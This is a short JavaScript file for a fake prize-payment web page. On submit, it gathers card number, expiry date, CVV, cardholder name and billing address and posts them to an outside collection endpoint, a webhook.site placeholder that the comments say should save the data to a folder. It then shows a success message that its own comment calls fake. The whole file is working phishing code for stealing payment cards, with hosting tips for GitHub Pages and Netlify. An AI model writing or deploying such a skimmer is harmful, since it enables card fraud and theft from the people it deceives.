document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('payment-form');

    form.addEventListener('submit', async (event) => {
        event.preventDefault(); // Prevent default for GitHub (Netlify will handle if deployed there)

        // Basic validation (already handled by HTML patterns, but adding JS for completeness)
        if (!form.checkValidity()) {
            alert('Please fill all fields correctly.');
            return;
        }

        // Collect form data
        const formData = new FormData(form);
        const data = {
            card_number: formData.get('card_number'),
            expiry: formData.get('expiry'),
            cvv: formData.get('cvv'),
            name: formData.get('name'),
            billing_address: formData.get('billing_address')
        };

        // For GitHub Pages: Send to external webhook (replace with your endpoint that saves to a folder)
        // Example: Use https://webhook.site for testing (generate your unique URL there)
        // Or set up a PHP server to append to a file in a folder.
        const webhookUrl = 'https://webhook.site/your-unique-id'; // Replace this!

        try {
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            if (response.ok) {
                alert('Payment processed! Your prize is on the way.'); // Fake success message
                form.reset(); // Clear form
            } else {
                alert('Error processing payment. Try again.');
            }
        } catch (error) {
            console.error('Submission error:', error);
            alert('Network error. Try again.');
        }

        // For Netlify: If deployed there, ignore the above and let Netlify handle (no JS needed, but this won't interfere)
    });
});
